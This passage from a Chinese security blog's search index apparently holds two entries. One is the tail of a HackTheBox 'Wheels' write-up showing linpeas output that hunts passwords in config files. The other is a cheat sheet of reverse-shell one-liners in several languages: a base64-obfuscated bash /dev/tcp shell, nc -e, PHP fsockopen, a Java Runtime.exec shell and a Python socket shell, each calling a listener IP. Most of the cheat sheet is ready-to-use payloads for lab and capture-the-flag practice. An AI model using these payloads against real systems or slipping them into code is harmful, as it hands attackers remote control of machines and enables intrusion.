MAPNAME=\u0026#34;secure\u0026#34;; DEV=\u0026#34;/dev/vdg\u0026#34;; PASSWORD=\u0026#34;foobar\u0026#34; /etc/overlayroot.conf:# crypt:dev=/dev/vdb,pass=somepassword,mkfs=0 /etc/pam.d/common-password:password [success=1 default=ignore] pam_unix.so obscure sha512 /etc/security/namespace.init: gid=$(echo \u0026#34;$passwd\u0026#34; | cut -f4 -d\u0026#34;:\u0026#34;) /etc/security/namespace.init: homedir=$(echo \u0026#34;$passwd\u0026#34; | cut -f6 -d\u0026#34;:\u0026#34;) /etc/security/namespace.init: passwd=$(getent passwd \u0026#34;$user\u0026#34;) /etc/sos/sos.conf:#password = true /etc/ssl/openssl.cnf:challengePassword = A challenge password /etc/ssl/openssl.cnf:challengePassword_max = 20 /etc/ssl/openssl.cnf:challengePassword_min = 4 /etc/ssl/openssl.cnf:# input_password = secret /etc/ssl/openssl.cnf:# output_password = secret /var/backups/dpkg.status.0:Depends: passwd, debconf (\u0026gt;= 0.5) | debconf-2.0 [+] Finding possible password variables inside key folders (limit 140) /var/www/html/lib/tempusdominus/js/tempusdominus-bootstrap-4.js: DATA_API_KEY = \u0026#39;.data-api\u0026#39;, [+] Finding possible password in config files /etc/adduser.conf passwd /etc/nsswitch.conf passwd: files systemd /etc/apache2/apache2.conf passwd files from being /etc/debconf.conf passwords. password passwords. passwords password passwords.dat passwords and one for everything else. passwords password is really Passwd: secret /etc/overlayroot.conf password is randomly generated password will be stored for recovery in passwd password,mkfs=0 PASSWORD=\u0026#34;foobar\u0026#34; PASSWORD\u0026#34; | PASSWORD\u0026#34; | PASSWORD HERE IN THIS CLEARTEXT CONFIGURATION passwords are more secure, but you won\u0026#39;t be able to passwords are generated by calculating the sha512sum /etc/sysctl.d/10-ptrace.conf credentials that exist in memory (re-using existing SSH connections, /etc/security/faillock.conf passwd and ignore centralized (AD, IdM, LDAP, etc.) users. [+] Finding \u0026#39;username\u0026#39; string inside key folders (limit 70) /var/www/html/login.php: $query = $connection-\u0026gt;prepare(\u0026#34;SELECT * FROM users WHERE username=:username\u0026#34;); /var/www/html/login.php: $query-\u0026gt;bindParam(\u0026#34;username\u0026#34;, $username, PDO::PARAM_STR); /var/www/html/login.php: $username = $_POST[\u0026#39;username\u0026#39;]; /var/www/html/login.php: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; pattern=\u0026#34;[a-zA-Z0-9]+\u0026#34; required /\u0026gt; /var/www/html/register.php: $query-\u0026gt;bindParam(\u0026#34;username\u0026#34;, $username, PDO::PARAM_STR); /var/www/html/register.php: $username = $_POST[\u0026#39;username\u0026#39;]; /var/www/html/register.php: \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;username\u0026#34; pattern=\u0026#34;[a-zA-Z0-9]+\u0026#34; required /\u0026gt; [+] Searching specific hashes inside files - less false positives (limit 70) ","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/wheels/","summary":"bob@wheels:~$ ./linpeas.sh ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄ ▄▄▄ ▄▄▄▄▄ ▄▄▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄ ▄ ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄ ▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄ ▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄ ▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ linpeas v3.","title":""},{"content":"反弹shell的各种编码各种语言 base64编码后的linux下/bin/bash反弹shell: bash -c \u0026lsquo;{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDYuMTMuMC4yNDMvMTIzNDUgMD4mMQ=}|{base64,-d}|{bash,-i}\u0026rsquo; linux的/bin/bash版本反弹shell： bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.45.217/1234 0\u0026gt;\u0026amp;1\nbash -c \u0026ldquo;bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.45.226/443 0\u0026gt;\u0026amp;1\u0026rdquo;\nnc -e /bin/bash 192.168.45.5 1234\nnc 192.168.45.5 1234|/bin/bash|192.168.45.5 12345\nphp -r \u0026#39;$sock=fsockopen(\u0026#34;192.168.45.5\u0026#34;,1234);exec(\u0026#34;/bin/sh -i \u0026lt;\u0026amp;3 \u0026gt;\u0026amp;3 2\u0026gt;\u0026amp;3\u0026#34;);\u0026#39; java反弹shell源码: public class Revs { /**\n* @param args\r* @throws Exception */\rpublic static void main(String[] args) throws Exception { // TODO Auto-generated method stub Runtime r = Runtime.getRuntime(); String cmd[]= {\u0026quot;/bin/bash\u0026quot;,\u0026quot;-c\u0026quot;,\u0026ldquo;exec 5\u0026lt;\u0026gt;/dev/tcp/192.168.99.242/1234;cat \u0026lt;\u0026amp;5 | while read line; do $line 2\u0026gt;\u0026amp;5 \u0026gt;\u0026amp;5; done\u0026rdquo;}; Process p = r.exec(cmd); p.waitFor(); } } javac将.java为jar执行 python互动式终端：\npython -c \u0026lsquo;import pty; pty.spawn (\u0026quot;/bin/bash\u0026quot;)\u0026rsquo;\npython3 -c \u0026lsquo;import pty; pty.spawn (\u0026quot;/bin/bash\u0026quot;)\u0026rsquo;\npython反弹shell\npython -c \u0026ldquo;import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\u0026lsquo;10.10.16.9\u0026rsquo;,1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\u0026rsquo;/bin/bash\u0026rsquo;,\u0026rsquo;-i\u0026rsquo;]);\u0026rdquo;\n","permalink":"https://netuseradministrator.github.io/zh/posts/hackthebox/%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%90%84%E7%A7%8D%E7%BC%96%E7%A0%81%E5%90%84%E7%A7%8D%E8%AF%AD%E8%A8%80/","summary":"反弹shell的各种编码各种语言 base64编码后的linux下/bin/bash反弹shell: bash -c \u0026lsquo;{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMDYuMTMuMC4yNDMvMTIzNDUgMD4mMQ=}|{base64,-d}|{bash,-i}\u0026rsquo; linux的/bin/bash版本反","title":""}]